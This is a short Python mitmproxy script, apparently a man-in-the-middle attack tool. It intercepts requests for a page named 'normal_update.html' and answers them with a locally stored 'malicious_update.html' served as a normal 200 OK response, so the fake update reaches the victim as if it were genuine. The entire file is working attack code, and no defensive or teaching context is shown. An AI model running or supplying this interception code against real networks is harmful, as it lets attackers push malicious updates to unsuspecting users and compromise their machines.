from mitmproxy import http
import time

def request(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_url.endswith("normal_update.html"):
        with open("malicious_update.html", "rb") as f:
            content_bytes = f.read()
        flow.response = http.Response(
            http_version=b"HTTP/1.1",
            reason=b"OK",
            trailers=None,
            timestamp_start=flow.request.timestamp_start,
            timestamp_end=time.time(),
            status_code=200,
            content=content_bytes,
            headers=[(b"Content-Type", b"text/html")]
        )